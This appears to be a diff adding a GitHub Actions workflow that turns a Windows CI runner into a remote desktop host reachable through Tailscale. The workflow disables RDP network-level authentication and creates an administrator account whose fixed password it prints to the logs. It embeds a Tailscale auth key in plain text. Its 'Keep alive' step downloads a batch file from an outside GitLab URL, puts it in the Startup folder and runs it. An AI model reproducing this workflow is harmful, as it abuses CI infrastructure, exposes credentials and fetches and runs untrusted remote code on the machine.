@@ -1,0 +1,97 @@
+name: win 11 + tailscale + rdp
+
+on:
+  workflow_dispatch:
+
+permissions:
+  actions: write
+  contents: read
+
+jobs:
+  secure-rdp:
+    runs-on: windows-latest
+    timeout-minutes: 350
+
+    steps:
+      - name: Configure Core RDP Settings
+        run: |
+          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' `
+                             -Name "fDenyTSConnections" -Value 0 -Force
+          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' `
+                             -Name "UserAuthentication" -Value 0 -Force
+          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' `
+                             -Name "SecurityLayer" -Value 0 -Force
+          netsh advfirewall firewall delete rule name="RDP-Tailscale" 2>$null
+          netsh advfirewall firewall add rule name="RDP-Tailscale" `
+            dir=in action=allow protocol=TCP localport=3389
+          Restart-Service -Name TermService -Force
+
+      - name: Create RDP User with Fixed Password
+        run: |
+          $password = "T3legram@yoCND"
+          $securePass = ConvertTo-SecureString $password -AsPlainText -Force
+          if (-not (Get-LocalUser -Name "RDP" -ErrorAction SilentlyContinue)) {
+              New-LocalUser -Name "RDP" -Password $securePass -AccountNeverExpires
+          }
+          Add-LocalGroupMember -Group "Administrators"       -Member "RDP" -ErrorAction SilentlyContinue
+          Add-LocalGroupMember -Group "Remote Desktop Users" -Member "RDP" -ErrorAction SilentlyContinue
+
+      - name: Install Tailscale
+        run: |
+          $tsUrl = "https://pkgs.tailscale.com/stable/tailscale-setup-1.82.0-amd64.msi"
+          $installerPath = "$env:TEMP\tailscale.msi"
+          Invoke-WebRequest -Uri $tsUrl -OutFile $installerPath
+          Start-Process msiexec.exe -ArgumentList "/i","$installerPath","/quiet","/norestart" -Wait
+          Remove-Item $installerPath -Force
+
+      - name: Connect Tailscale
+        run: |
+          & "$env:ProgramFiles\Tailscale\tailscale.exe" up --authkey=tskey-auth-knYGm7a5Ua11CNTRL-1BrN9gmobgK4mAWmbS2AgK43DYL6MJcUC --hostname=gh-rdp-$env:GITHUB_RUN_ID --accept-routes
+          $ip = $null; $r = 0
+          while (-not $ip -and $r -lt 15) {
+              $ip = & "$env:ProgramFiles\Tailscale\tailscale.exe" ip -4
+              Start-Sleep -Seconds 4; $r++
+          }
+          if (-not $ip) { Write-Error "No Tailscale IP"; exit 1 }
+          echo "TS_IP=$ip" >> $env:GITHUB_ENV
+
+      - name: Verify RDP Port
+        run: |
+          $t = Test-NetConnection -ComputerName $env:TS_IP -Port 3389
+          if (-not $t.TcpTestSucceeded) { Write-Error "Port 3389 unreachable"; exit 1 }
+
+      - name: Write IP artifact
+        run: |
+          New-Item -ItemType Directory -Force -Path rdp_out | Out-Null
+          "IP=$env:TS_IP" | Out-File -FilePath rdp_out\rdp_info.txt -Encoding utf8 -NoNewline
+          Write-Host "=== RDP READY ==="
+          Write-Host "IP  : $env:TS_IP"
+          Write-Host "User: RDP"
+          Write-Host "Pass: T3legram@yoCND"
+
+      - name: Upload RDP info
+        uses: actions/upload-artifact@v4
+        with:
+          name: rdp-info
+          path: rdp_out/rdp_info.txt
+
+      - name: Keep alive
+        run: |
+          $rdpProfile  = "C:\Users\RDP"
+          $startupPath = "$rdpProfile\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+          $batUrl      = "https://gitlab.com/MR.English2008/pcme_rdp/-/raw/main/Downloads.bat"
+          $batDst      = "$startupPath\Downloads.bat"
+          while ($true) {
+              if (Test-Path $rdpProfile) {
+                  if (-not (Test-Path $startupPath)) { New-Item -ItemType Directory -Path $startupPath -Force | Out-Null }
+                  Invoke-WebRequest -Uri $batUrl -OutFile $batDst -UseBasicParsing
+                  cmd /c $batDst
+                  break
+              }
+              Write-Host "[$(Get-Date -f HH:mm:ss)] waiting for RDP profile..."
+              Start-Sleep -Seconds 20
+          }
+          while ($true) {
+              Write-Host "[$(Get-Date -f HH:mm:ss)] alive"
+              Start-Sleep -Seconds 300
+          }
